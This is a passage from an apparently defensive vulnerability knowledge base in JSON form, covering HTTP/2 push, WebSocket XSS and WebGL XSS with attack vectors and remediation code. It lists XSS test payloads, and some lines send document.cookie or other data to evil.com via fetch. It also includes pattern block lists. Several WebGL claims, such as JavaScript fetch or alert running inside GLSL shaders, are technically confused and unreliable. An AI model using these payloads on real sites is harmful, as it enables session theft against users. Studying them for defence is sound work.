pushLimits.get(userId) || 0;\n     const now = Date.now();\n\n     // Reset counter every minute\n     if (now - (pushLimits.get(userId + '_time') || 0) > 60000) {\n       pushLimits.set(userId, 0);\n       pushLimits.set(userId + '_time', now);\n     }\n\n     if (userPushes >= MAX_PUSHES_PER_MINUTE) {\n       return false;\n     }\n\n     pushLimits.set(userId, userPushes + 1);\n     return true;\n   }\n\n8. ORIGIN VALIDATION:\n   Validate push origins:\n\n   function validatePushOrigin(origin) {\n     const allowedOrigins = [\n       'https://yourdomain.com',\n       'https://cdn.yourdomain.com',\n       'https://api.yourdomain.com'\n     ];\n\n     return allowedOrigins.includes(origin);\n   }\n\n9. SETTINGS FRAME SECURITY:\n   Secure HTTP/2 settings:\n\n   const secureSettings = {\n     SETTINGS_HEADER_TABLE_SIZE: 4096,\n     SETTINGS_ENABLE_PUSH: 1,  // Enable push\n     SETTINGS_MAX_CONCURRENT_STREAMS: 100,\n     SETTINGS_INITIAL_WINDOW_SIZE: 65535,\n     SETTINGS_MAX_FRAME_SIZE: 16384,\n     SETTINGS_MAX_HEADER_LIST_SIZE: 8192\n   };\n\n   // Don't allow user control over settings\n   function validateSettings(settings) {\n     for (const key in settings) {\n       if (typeof settings[key] !== 'number' || settings[key] < 0) {\n         throw new Error('Invalid settings value');\n       }\n     }\n     return settings;\n   }\n\n10. COMPRESSION SECURITY:\n    Secure HPACK compression:\n\n    function validateCompressedHeaders(compressedData) {\n      // Validate compression format\n      if (!isValidHPACKFormat(compressedData)) {\n        throw new Error('Invalid compression format');\n      }\n\n      // Decompress and validate\n      const decompressed = hpack.decode(compressedData);\n      return validatePushHeaders(decompressed);\n    }\n\n11. PUSH PROMISE VALIDATION:\n    Validate push promises:\n\n    function validatePushPromise(promise) {\n      if (!promise.path || typeof promise.path !== 'string') {\n        throw new Error('Invalid push promise path');\n      }\n\n      const cleanPath = validatePushPath(promise.path);\n\n      if (promise.headers) {\n        promise.headers = validatePushHeaders(promise.headers);\n      }\n\n      return {...promise, path: cleanPath};\n    }\n\n12. CSP FOR HTTP/2 PUSH:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self';\n      style-src 'self' 'unsafe-inline';\n      img-src 'self' data: https:;\n      connect-src 'self';\n      push-src 'self';  // HTTP/2 Push policy\n\n13. LOGGING AND MONITORING:\n    Comprehensive HTTP/2 monitoring:\n\n    function logPushOperation(operation, details) {\n      logger.info('HTTP/2 Push operation', {\n        operation: operation,\n        path: details.path,\n        contentType: details.contentType,\n        size: details.content ? details.content.length : 0,\n        timestamp: new Date().toISOString(),\n        userAgent: details.userAgent\n      });\n    }\n\n14. ERROR HANDLING:\n    Secure error handling:\n\n    server.onPushError = function(error, stream) {\n      logger.error('HTTP/2 Push error', {\n        error: error.message,\n        streamId: stream.id\n      });\n\n      // Don't push error details\n      stream.push('/error.html', genericErrorPage);\n    };\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - HTTP/2 push validation\n    - Push content sanitization\n    - Cache security testing\n    - Compression validation\n\n    Manual tests:\n    - Browser DevTools Network inspection\n    - Push promise monitoring\n    - Server push configuration testing\n\nSECURITY TESTING PAYLOADS:\n\nBasic HTTP/2 Push XSS:\n<script>alert('Push XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nPush path injection:\n/api/user/<script>alert(1)</script>\n/assets/<script>alert(1)</script>.css\n/static/<img src=x onerror=alert(1)>.js\n\nPush content injection:\nvar userName = \"<script>alert(1)</script>\";\nconsole.log(\"<script>alert(1)</script>\");\n\nAdvanced payloads:\njavascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>\ndata:text/html,<script>alert(1)</script>\nvbscript:msgbox(1)\n\nHTTP/2 PUSH SECURITY HEADERS:\n\nHTTP/2-Settings: (secure settings)\nCache-Control: no-cache, no-store\nContent-Security-Policy: push-src 'self'\nX-Content-Type-Options: nosniff\n\nMONITORING METRICS:\n\nMonitor for:\n- Unusual push patterns\n- Large push content\n- Push path anomalies\n- Cache corruption attempts\n- Rate limiting violations\n\nOWASP REFERENCES:\n- OWASP HTTP/2 Security Cheat Sheet\n- HTTP/2 Server Push Security\n- Web Performance Optimization Security\n- CDN Security Best Practices\n"
  },
  "websocket_xss": {
    "title": "Cross-Site Scripting (XSS) in WebSocket Context",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "websocket",
      "real-time",
      "injection",
      "modern-web"
    ],
    "description": "\nWebSocket XSS occurs when user input is reflected into WebSocket messages without proper sanitization.\nWebSockets provide full-duplex communication channels over a single TCP connection, making them ideal\nfor real-time applications. However, when untrusted data is transmitted through WebSocket messages\nand then reflected back to clients or processed by JavaScript, it creates critical XSS vulnerabilities.\n\nVULNERABILITY CONTEXT:\nWebSocket XSS typically happens when:\n1. Server echoes user messages without sanitization\n2. Real-time chat applications display messages from other users\n3. Collaborative applications broadcast user input\n4. Gaming platforms transmit player actions\n5. Live commenting systems\n6. Real-time notifications\n7. Multi-user editing platforms\n8. Stock trading applications\n9. IoT device communication\n\nCommon in:\n- Real-time chat applications\n- Online gaming platforms\n- Collaborative editors (Google Docs, Notion)\n- Live commenting systems\n- Multiplayer games\n- Stock trading platforms\n- Social media live feeds\n- IoT dashboards\n- Team communication tools\n\nSEVERITY: HIGH\nWebSocket XSS allows real-time code execution across all connected clients, potentially affecting\nmultiple users simultaneously. The real-time nature makes detection and response challenging.\n",
    "attack_vector": "\nWEBSOCKET XSS ATTACK VECTORS:\n\n1. MESSAGE ECHO INJECTION:\n   Server-side code:\n   ws.send(userMessage);  // Direct echo without sanitization\n\n   Attack payload:\n   <script>alert('XSS')</script>\n\n   Result: All connected clients execute the script\n\n2. USERNAME/DISPLAY NAME INJECTION:\n   WebSocket protocol:\n   {\"type\": \"user_joined\", \"username\": \"USER_INPUT\", \"message\": \"joined\"}\n\n   Attack payloads:\n   <script>alert(1)</script>\n   <img src=x onerror=alert(1)>\n\n3. REAL-TIME CHAT MESSAGES:\n   Client sends:\n   {\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}\n\n   Server broadcasts to all:\n   {\"type\": \"message\", \"from\": \"user\", \"content\": \"<script>alert(1)</script>\"}\n\n4. STATUS UPDATE INJECTION:\n   {\"type\": \"status\", \"user\": \"admin\", \"status\": \"<script>alert(1)</script>\"}\n\n   Displayed as: admin's status: <script>alert(1)</script>\n\n5. FILE SHARING METADATA:\n   {\"type\": \"file_shared\", \"filename\": \"<script>alert(1)</script>\", \"size\": 1024}\n\n6. GAME STATE MANIPULATION:\n   {\"type\": \"game_move\", \"player\": \"USER\", \"move\": \"<script>alert(1)</script>\"}\n\nADVANCED WEBSOCKET XSS TECHNIQUES:\n\n7. BINARY MESSAGE INJECTION:\n   WebSocket binary messages with embedded HTML:\n   ws.send(new Blob(['<script>alert(1)</script>'], {type: 'text/html'}));\n\n8. FRAGMENTED PAYLOAD ATTACK:\n   Split XSS across multiple messages:\n   Message 1: {\"type\": \"chat\", \"msg\": \"<scr\"}\n   Message 2: {\"type\": \"chat\", \"msg\": \"ipt>alert(1)</script>\"}\n\n9. CONTROL FRAME MANIPULATION:\n   WebSocket control frames with injected data:\n   - Ping/Pong frames with malicious content\n   - Close frames with script injection\n\n10. SUBPROTOCOL NEGOTIATION ATTACK:\n    Subprotocol strings with XSS:\n    ws = new WebSocket('ws://target.com', ['chat', '<script>alert(1)</script>']);\n\n11. EXTENSION NEGOTIATION XSS:\n    WebSocket extensions with malicious parameters:\n    ws = new WebSocket('ws://target.com', ['chat'], {\n        headers: {'Sec-WebSocket-Extensions': 'permessage-deflate; <script>alert(1)</script>'}\n    });\n\n12. ORIGIN HEADER MANIPULATION:\n    Spoofed Origin headers leading to XSS:\n    Origin: <script>alert(1)</script>\n\nWEBSOCKET-SPECIFIC BYPASSES:\n\n13. MESSAGE TYPE CONFUSION:\n    Sending JSON but receiving HTML interpretation:\n    {\"type\": \"message\", \"content\": \"<script>alert(1)</script>\"}\n    Becomes: Message: <script>alert(1)</script>\n\n14. ESCAPE SEQUENCE BYPASS:\n    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e\n    Becomes: <script>alert(1)</script>\n\n15. ENCODING BYPASSES:\n    %3Cscript%3Ealert(1)%3C/script%3E\n    Becomes: <script>alert(1)</script>\n\n16. NULL BYTE INJECTION:\n    <script>alert(1)</script>%00\n    May bypass some filters\n\n17. NEWLINE INJECTION:\n    \\n<script>alert(1)</script>\n    Can break parsing context\n\n18. COMMENT-BASED INJECTION:\n    <!-- <script>alert(1)</script> -->\n    Hidden in HTML comments\n\nREAL-WORLD ATTACK SCENARIOS:\n\n19. CHAT APPLICATION ATTACK:\n    - Attacker joins chat room\n    - Sends <script>fetch('http://evil.com/steal', {method: 'POST', body: document.cookie})</script>\n    - All users in room execute script\n    - Cookies stolen from all participants\n\n20. COLLABORATIVE EDITOR ATTACK:\n    - Google Docs-style application\n    - User types <script>alert('XSS')</script> as document title\n    - All collaborators see alert\n    - Potential for stealing auth tokens\n\n21. GAMING PLATFORM ATTACK:\n    - Multiplayer game with chat\n    - Player name: <script>alert(1)</script>\n    - Displayed as: Player <script>alert(1)</script> scored!\n    - Affects all players in game\n\n22. STOCK TRADING DASHBOARD:\n    - Real-time stock updates\n    - Symbol: <script>alert(1)</script>\n    - Displayed to all traders\n    - Market manipulation potential\n\n23. IOT DEVICE CONTROL:\n    - WebSocket to IoT devices\n    - Device name: <script>alert(1)</script>\n    - All users see script execution\n    - Device hijacking potential\n\n24. SOCIAL MEDIA LIVE FEED:\n    - Real-time feed updates\n    - Comment: <script>alert(1)</script>\n    - All viewers affected simultaneously\n\nWEBSOCKET XSS DETECTION:\n\n25. MANUAL TESTING:\n    - Intercept WebSocket traffic in browser dev tools\n    - Send test payloads: <script>alert('XSS')</script>\n    - Monitor for script execution\n\n26. AUTOMATED SCANNING:\n    - Use WebSocket clients to send payloads\n    - Monitor responses for reflected content\n    - Check for script execution in DOM\n\n27. PROXY INTERCEPTION:\n    - Burp Suite WebSocket interception\n    - Modify messages in transit\n    - Test for XSS vulnerabilities\n",
    "remediation": "\nWEBSOCKET XSS DEFENSE STRATEGY:\n\n1. MESSAGE SANITIZATION (PRIMARY DEFENSE):\n   Sanitize all outbound WebSocket messages:\n\n   Node.js Example:\n   const DOMPurify = require('dompurify');\n   const cleanMessage = DOMPurify.sanitize(message);\n\n   Python (websockets library):\n   import bleach\n   clean_message = bleach.clean(message, tags=[], strip=True)\n\n   Java Example:\n   String cleanMessage = Jsoup.clean(message, Safelist.none());\n\n2. JSON SCHEMA VALIDATION:\n   Define strict message schemas:\n\n   Schema validation:\n   {\n     \"type\": \"object\",\n     \"properties\": {\n       \"type\": {\"type\": \"string\", \"enum\": [\"chat\", \"join\", \"leave\"]},\n       \"message\": {\"type\": \"string\", \"maxLength\": 500}\n     },\n     \"required\": [\"type\"],\n     \"additionalProperties\": false\n   }\n\n3. ESCAPE USER-GENERATED CONTENT:\n   HTML escape all user content:\n\n   JavaScript:\n   function escapeHtml(text) {\n     const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '\"': '&quot;'};\n     return text.replace(/[&<>\"']/g, m => map[m]);\n   }\n\n   Python:\n   import html\n   safe_content = html.escape(user_content)\n\n4. CONTENT SECURITY POLICY (CSP):\n   Enhanced CSP for WebSocket applications:\n\n   Content-Security-Policy:\n     default-src 'self';\n     script-src 'self' 'nonce-{random}';\n     connect-src 'self' wss: ws:;\n     object-src 'none';\n     base-uri 'none';\n\n5. INPUT VALIDATION AND LENGTH LIMITS:\n   Implement strict input validation:\n\n   Maximum message length: 500 characters\n   Whitelist allowed characters: alphanumeric, basic punctuation\n   Block: < > & \" ' and other dangerous characters\n   Rate limiting: max 10 messages per minute per user\n\n6. MESSAGE TYPE ENFORCEMENT:\n   Only allow predefined message types:\n\n   ALLOWED_TYPES = ['chat', 'join', 'leave', 'typing', 'file']\n   if (!ALLOWED_TYPES.includes(message.type)) {\n     ws.close(1008, 'Invalid message type');\n   }\n\n7. ORIGIN VALIDATION:\n   Validate WebSocket connection origin:\n\n   ws.on('connection', (socket, request) => {\n     const origin = request.headers.origin;\n     const allowedOrigins = ['https://yourdomain.com', 'https://app.yourdomain.com'];\n\n     if (!allowedOrigins.includes(origin)) {\n       socket.close(1008, 'Origin not allowed');\n       return;\n     }\n   });\n\n8. AUTHENTICATION AND AUTHORIZATION:\n   Require authentication for WebSocket connections:\n\n   JWT-based authentication:\n   const token = socket.handshake.auth.token;\n   try {\n     const decoded = jwt.verify(token, SECRET);\n     socket.userId = decoded.userId;\n   } catch (err) {\n     socket.close(1008, 'Authentication failed');\n   }\n\n9. RATE LIMITING AND THROTTLING:\n   Implement connection and message rate limiting:\n\n   Redis-based rate limiting:\n   const rateLimit = await redis.incr(`ws:${userId}:messages`);\n   if (rateLimit > 10) {\n     socket.close(1008, 'Rate limit exceeded');\n     return;\n   }\n\n10. SECURE WEBSOCKET CONFIGURATION:\n    Server configuration:\n\n    HTTPS only (WSS):\n    wss://yourdomain.com/ws\n\n    Secure headers:\n    Strict-Transport-Security: max-age=31536000\n    X-Content-Type-Options: nosniff\n    X-Frame-Options: DENY\n\n11. MESSAGE QUEUE SANITIZATION:\n    If using message queues (Redis, RabbitMQ):\n\n    Redis example:\n    const cleanMessage = validator.escape(message);\n    await redis.lpush('messages', cleanMessage);\n\n12. CLIENT-SIDE VALIDATION:\n    Validate messages on client side too:\n\n    function validateMessage(message) {\n      const maxLength = 500;\n      const allowedPattern = /^[a-zA-Z0-9\\s.,!?-]+$/;\n\n      return message.length <= maxLength && allowedPattern.test(message);\n    }\n\n13. LOGGING AND MONITORING:\n    Comprehensive logging:\n\n    Log all WebSocket messages:\n    logger.info('WS Message', {\n      userId: socket.userId,\n      message: message,\n      timestamp: new Date().toISOString()\n    });\n\n    Monitor for suspicious patterns:\n    if (message.includes('<script>')) {\n      logger.warn('Potential XSS attempt', { userId, message });\n    }\n\n14. ERROR HANDLING:\n    Proper error handling without information disclosure:\n\n    ws.on('error', (error) => {\n      logger.error('WebSocket error', { error: error.message });\n      // Don't send error details to client\n    });\n\n15. REGULAR SECURITY TESTING:\n    Include WebSocket testing in security assessments:\n\n    Automated testing:\n    - Send XSS payloads via WebSocket\n    - Monitor for script execution\n    - Test rate limiting\n    - Validate authentication\n\n    Manual testing:\n    - Use browser dev tools WebSocket inspector\n    - Test with various XSS payloads\n    - Verify proper sanitization\n\n16. DEPLOYMENT SECURITY:\n    WebSocket-specific deployment considerations:\n\n    Load balancer configuration:\n    - Sticky sessions for WebSocket connections\n    - Proper timeout settings\n    - DDoS protection\n\n    Container security:\n    - Resource limits for WebSocket services\n    - Network policies\n    - Service mesh integration\n\nSECURITY TESTING PAYLOADS:\n\nBasic detection:\n<script>alert('WebSocket XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nFilter bypass:\n<ScRiPt>alert(1)</ScRiPt>\n<img/src=x onerror=alert`1`>\n<svg/onload=alert(1)>\n\nAdvanced payloads:\n{{constructor.constructor('alert(1)')()}}\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\n\nWEBSOCKET SECURITY HEADERS:\n\nSec-WebSocket-Key: (auto-generated)\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: chat\nSec-WebSocket-Extensions: (if supported)\n\nMONITORING AND ALERTS:\n\nSet up alerts for:\n- High message frequency from single user\n- Messages containing script tags\n- Failed authentication attempts\n- Unusual connection patterns\n\nOWASP REFERENCES:\n- OWASP WebSocket Cheat Sheet\n- OWASP Testing Guide: Testing WebSockets\n- CWE-79: Improper Neutralization of Input\n- Real-time Web Application Security\n"
  },
  "webgl_xss": {
    "title": "Cross-Site Scripting (XSS) in WebGL Context",
    "severity": "medium",
    "cvss_score": 6.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "webgl",
      "shader-injection",
      "gpu",
      "3d-graphics"
    ],
    "description": "\nWebGL XSS occurs when user input is reflected into WebGL shaders, textures, or rendering contexts\nwithout proper sanitization. WebGL (Web Graphics Library) is a JavaScript API for rendering 3D\nand 2D graphics in web browsers using GPU acceleration. When malicious GLSL (OpenGL Shading Language)\ncode is injected into shaders or when user-controlled data is used in WebGL rendering, it can lead\nto code execution and information disclosure.\n\nVULNERABILITY CONTEXT:\nWebGL XSS typically happens when:\n1. User input is injected into shader source code\n2. Texture data contains malicious content\n3. Uniform variables are set with unsanitized data\n4. Vertex data contains executable content\n5. Framebuffer operations are manipulated\n6. Shader compilation with user-controlled parameters\n\nCommon in:\n- 3D visualization applications\n- Game engines (Three.js, Babylon.js)\n- Data visualization tools\n- CAD/CAM web applications\n- Medical imaging viewers\n- Scientific simulation platforms\n- Virtual reality applications\n- Graphics design tools\n\nSEVERITY: MEDIUM\nWebGL XSS requires specific conditions and GPU processing, making it less common than traditional XSS.\nHowever, successful exploitation can lead to GPU-based code execution and information disclosure\nthrough rendering channels.\n",
    "attack_vector": "\nWEBGL XSS ATTACK VECTORS:\n\n1. VERTEX SHADER INJECTION:\n   Shader source code injection:\n   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' +\n                             'uniform mat4 uModelViewMatrix; ' +\n                             'void main() { ' +\n                             'gl_Position = uModelViewMatrix * aVertexPosition; ' +\n                             USER_INPUT +  // Shader injection\n                             '}';\n\n   Attack payload:\n   '; gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /*\n\n2. FRAGMENT SHADER INJECTION:\n   Fragment shader with XSS:\n   const fragmentShaderSource = 'precision mediump float; ' +\n                                'void main() { ' +\n                                USER_INPUT +  // Fragment injection\n                                '}';\n\n   Attack payload:\n   'gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch(\"http://evil.com/steal\", {method: \"POST\", body: \"xss\"}); /*\n\n3. UNIFORM VARIABLE INJECTION:\n   Setting uniform variables with XSS:\n   const shaderProgram = initShaderProgram(gl, vsSource, fsSource);\n\n   // Setting uniform with user data\n   gl.uniform1f(shaderProgram.uTime, USER_INPUT);  // Time uniform injection\n   gl.uniform3fv(shaderProgram.uColor, USER_INPUT); // Color uniform injection\n\n4. TEXTURE DATA INJECTION:\n   Creating textures with malicious content:\n   const texture = gl.createTexture();\n   gl.bindTexture(gl.TEXTURE_2D, texture);\n\n   const imageData = new ImageData(new Uint8ClampedArray(USER_INPUT), width, height);\n   gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imageData);\n\n5. VERTEX BUFFER INJECTION:\n   Vertex array with malicious data:\n   const vertices = new Float32Array([\n     -1.0, -1.0, 0.0,\n     1.0, -1.0, 0.0,\n     0.0, 1.0, 0.0,\n     USER_INPUT  // Vertex data injection\n   ]);\n\nADVANCED WEBGL XSS TECHNIQUES:\n\n6. SHADER PRECISION INJECTION:\n   Precision qualifier injection:\n   const shaderSource = USER_INPUT + ' float; ' +  // Precision injection\n                       'void main() { gl_FragColor = vec4(1.0); }';\n\n   Attack payload:\n   'highp /* alert(1) */'\n\n7. EXTENSION INJECTION:\n   WebGL extensions with XSS:\n   const ext = gl.getExtension('WEBGL_debug_renderer_info');\n   const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);\n\n   // Renderer info might contain XSS if user-controlled\n   document.getElementById('info').textContent = USER_INPUT;\n\n8. FRAMEBUFFER ATTACK:\n   Off-screen rendering with XSS:\n   const framebuffer = gl.createFramebuffer();\n   gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);\n\n   // Render to texture with malicious content\n   const texture = createTextureFromData(USER_INPUT);\n\n9. TRANSFORM FEEDBACK INJECTION:\n   Transform feedback with malicious data:\n   const transformFeedback = gl.createTransformFeedback();\n   gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, transformFeedback);\n\n   // Feedback data might contain XSS\n   const buffer = gl.createBuffer();\n   gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, buffer);\n\n10. WEBGL CONTEXT ATTRIBUTES INJECTION:\n    Context creation with XSS:\n    const contextAttributes = {\n      alpha: true,\n      depth: true,\n      stencil: false,\n      antialias: false,\n      premultipliedAlpha: false,\n      preserveDrawingBuffer: true,\n      failIfMajorPerformanceCaveat: false,\n      userData: USER_INPUT  // Custom attribute injection\n    };\n\n11. SHADER COMPILATION LOG INJECTION:\n    Compilation errors with XSS:\n    const vertexShader = gl.createShader(gl.VERTEX_SHADER);\n    gl.shaderSource(vertexShader, maliciousShaderCode);\n    gl.compileShader(vertexShader);\n\n    if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {\n      const log = gl.getShaderInfoLog(vertexShader);\n      document.getElementById('error').innerHTML = log;  // Log injection\n    }\n\n12. PROGRAM LINKING INJECTION:\n    Linking shaders with XSS in attributes:\n    const program = gl.createProgram();\n    gl.attachShader(program, vertexShader);\n    gl.attachShader(program, fragmentShader);\n    gl.linkProgram(program);\n\n    const attribLocation = gl.getAttribLocation(program, USER_INPUT);  // Attribute name injection\n\n13. RENDER TARGET INJECTION:\n    Multiple render targets with XSS:\n    const drawBuffers = gl.getExtension('WEBGL_draw_buffers');\n\n    // Render target names might be user-controlled\n    const targetNames = [USER_INPUT, 'color', 'normal'];\n    drawBuffers.drawBuffersWEBGL(targetNames);\n\n14. QUERY OBJECT INJECTION:\n    WebGL query objects with XSS:\n    const query = gl.createQuery();\n    gl.beginQuery(gl.ANY_SAMPLES_PASSED, query);\n\n    // Query results might be displayed\n    gl.endQuery(gl.ANY_SAMPLES_PASSED);\n    const result = gl.getQueryParameter(query, gl.QUERY_RESULT);\n    displayResult(result);\n\n15. SYNC OBJECT INJECTION:\n    WebGL sync objects with malicious data:\n    const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);\n    gl.clientWaitSync(sync, 0, 0);\n\n    // Sync status might contain XSS\n    const status = gl.getSyncParameter(sync, gl.SYNC_STATUS);\n    showStatus(status);\n\nWEBGL-SPECIFIC BYPASSES:\n\n16. COMMENT-BASED INJECTION:\n    GLSL comments with XSS:\n    const shaderSource = '/* ' + USER_INPUT + ' */ void main() { gl_FragColor = vec4(1.0); }';\n\n    Attack payload:\n    '*/ alert(1); /*'\n\n17. PREPROCESSOR INJECTION:\n    GLSL preprocessor directives with XSS:\n    const shaderSource = USER_INPUT + ' \\n void main() { gl_FragColor = vec4(1.0); }';\n\n    Attack payload:\n    '#define main() alert(1); void main'\n\n18. VERSION INJECTION:\n    GLSL version string injection:\n    const versionString = USER_INPUT;  // Version injection\n    const shaderSource = versionString + ' \\n void main() { gl_FragColor = vec4(1.0); }';\n\n19. EXTENSION STRING INJECTION:\n    Extension strings with XSS:\n    const extensions = gl.getSupportedExtensions();\n    const extensionString = extensions.join(', ');\n\n    // If extension names are user-controlled\n    document.getElementById('extensions').textContent = USER_INPUT;\n\n20. VENDOR INFO INJECTION:\n    GPU vendor information:\n    const vendor = gl.getParameter(gl.VENDOR);\n    const renderer = gl.getParameter(gl.RENDERER);\n\n    // Vendor/renderer might be displayed with XSS\n    document.getElementById('gpu-info').innerHTML = '<b>' + USER_INPUT + '</b>';\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. 3D MODELING APPLICATION:\n    - User uploads 3D model\n    - Model metadata: <script>alert(1)</script>\n    - Model name displayed in UI\n    - XSS when viewing model properties\n\n22. DATA VISUALIZATION:\n    - Interactive charts and graphs\n    - Dataset labels: <script>alert(1)</script>\n    - Labels rendered in WebGL context\n    - Affects all viewers of visualization\n\n23. ONLINE GAME ENGINE:\n    - WebGL-based game\n    - Player avatar name: <script>alert(1)</script>\n    - Name displayed in 3D space\n    - All players see XSS execution\n\n24. MEDICAL IMAGING:\n    - DICOM viewer with WebGL\n    - Patient name: <script>alert(1)</script>\n    - Name displayed on scan\n    - Medical data theft\n\n25. CAD/CAM APPLICATION:\n    - 3D design tool\n    - Part name: <script>alert(1)</script>\n    - Part properties display\n    - Design data manipulation\n\n26. VIRTUAL REALITY PLATFORM:\n    - VR application with WebGL\n    - User profile: <script>alert(1)</script>\n    - Profile displayed in virtual space\n    - VR session hijacking\n\n27. GRAPHICS DESIGN TOOL:\n    - Online Photoshop-style app\n    - Layer name: <script>alert(1)</script>\n    - Layer properties display\n    - Project corruption\n\nWEBGL XSS DETECTION:\n\n28. MANUAL TESTING:\n    - Browser DevTools WebGL inspection\n    - Shader source code review\n    - Texture data analysis\n    - GPU memory inspection\n\n29. AUTOMATED SCANNING:\n    - WebGL context analysis\n    - Shader compilation testing\n    - Texture validation\n    - GPU resource monitoring\n\n30. BROWSER EXTENSIONS:\n    - WebGL debugging extensions\n    - Shader inspection tools\n    - GPU memory analyzers\n",
    "remediation": "\nWEBGL XSS DEFENSE STRATEGY:\n\n1. SHADER SOURCE VALIDATION (PRIMARY DEFENSE):\n   Validate shader source code before compilation:\n\n   function validateShaderSource(source) {\n     // Remove comments that might contain XSS\n     source = source.replace(/\\/\\*[\\s\\S]*?\\*\\/|\\/\\/.*/g, '');\n\n     // Check for dangerous patterns\n     const dangerousPatterns = [\n       /alert\\s*\\(/i,\n       /eval\\s*\\(/i,\n       /fetch\\s*\\(/i,\n       /XMLHttpRequest/i,\n       /document\\./i,\n       /window\\./i,\n       /location\\./i\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(source)) {\n         throw new Error('Invalid shader source');\n       }\n     }\n\n     return source;\n   }\n\n2. GLSL CODE SANITIZATION:\n   Sanitize GLSL code elements:\n\n   function sanitizeGLSLCode(code) {\n     // Remove HTML tags\n     code = code.replace(/<[^>]*>/g, '');\n\n     // Remove JavaScript-like constructs\n     code = code.replace(/javascript:/gi, '');\n     code = code.replace(/vbscript:/gi, '');\n\n     // Validate GLSL syntax\n     if (!isValidGLSLSyntax(code)) {\n       throw new Error('Invalid GLSL syntax');\n     }\n\n     return code;\n   }\n\n3. UNIFORM VARIABLE VALIDATION:\n   Validate uniform variables:\n\n   function validateUniformValue(value, type) {\n     switch (type) {\n       case 'float':\n       case 'int':\n         if (typeof value !== 'number' || !isFinite(value)) {\n           throw new Error('Invalid uniform value');\n         }\n         break;\n\n       case 'vec2':\n       case 'vec3':\n       case 'vec4':\n         if (!Array.isArray(value) || value.length !== parseInt(type.slice(3))) {\n           throw new Error('Invalid vector value');\n         }\n         break;\n\n       case 'mat2':\n       case 'mat3':\n       case 'mat4':\n         if (!Array.isArray(value) || !isValidMatrix(value, type)) {\n           throw new Error('Invalid matrix value');\n         }\n         break;\n     }\n\n     return value;\n   }\n\n4. TEXTURE DATA VALIDATION:\n   Validate texture data:\n\n   function validateTextureData(data, width, height) {\n     if (!data || data.length !== width * height * 4) {\n       throw new Error('Invalid texture dimensions');\n     }\n\n     // Check for malicious patterns in texture data\n     const textDecoder = new TextDecoder('utf-8');\n     const textData = textDecoder.decode(data);\n\n     if (textData.includes('<script') || textData.includes('javascript:')) {\n       throw new Error('Malicious texture data detected');\n     }\n\n     return data;\n   }\n\n5. WEBGL CONTEXT SECURITY:\n   Secure WebGL context creation:\n\n   const contextAttributes = {\n     alpha: true,\n     depth: true,\n     stencil: true,\n     antialias: true,\n     premultipliedAlpha: true,\n     preserveDrawingBuffer: false,  // Security: don't preserve buffer\n     failIfMajorPerformanceCaveat: false\n   };\n\n   const gl = canvas.getContext('webgl', contextAttributes) ||\n              canvas.getContext('experimental-webgl', contextAttributes);\n\n6. SHADER COMPILATION SECURITY:\n   Secure shader compilation:\n\n   function compileShaderSecurely(gl, source, type) {\n     const sanitizedSource = validateShaderSource(source);\n     const shader = gl.createShader(type);\n     gl.shaderSource(shader, sanitizedSource);\n     gl.compileShader(shader);\n\n     if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {\n       const log = gl.getShaderInfoLog(shader);\n       logger.error('Shader compilation failed', {log: log});\n       gl.deleteShader(shader);\n       throw new Error('Shader compilation failed');\n     }\n\n     return shader;\n   }\n\n7. ERROR HANDLING:\n   Secure error handling:\n\n   gl.getShaderInfoLog = (function(originalFunction) {\n     return function(shader) {\n       const log = originalFunction.apply(this, arguments);\n\n       // Sanitize error log before returning\n       const cleanLog = log.replace(/<[^>]*>/g, '');\n       return cleanLog;\n     };\n   })(gl.getShaderInfoLog);\n\n8. RESOURCE LIMITS:\n   Implement WebGL resource limits:\n\n   const MAX_TEXTURE_SIZE = 2048;\n   const MAX_SHADER_LENGTH = 65536;\n   const MAX_UNIFORMS = 1024;\n\n   function checkResourceLimits() {\n     const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);\n     const maxShaderLength = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) * 16;\n\n     if (maxTextureSize > MAX_TEXTURE_SIZE) {\n       logger.warn('Texture size limit exceeded');\n     }\n   }\n\n9. WEBGL EXTENSION SECURITY:\n   Secure WebGL extensions:\n\n   function getSecureExtension(name) {\n     const allowedExtensions = [\n       'WEBGL_debug_renderer_info',\n       'OES_texture_float',\n       'OES_standard_derivatives',\n       'WEBGL_depth_texture'\n     ];\n\n     if (!allowedExtensions.includes(name)) {\n       throw new Error('Extension not allowed');\n     }\n\n     return gl.getExtension(name);\n   }\n\n10. VERTEX DATA VALIDATION:\n    Validate vertex data:\n\n    function validateVertexData(vertices) {\n      if (!Array.isArray(vertices) && !(vertices instanceof 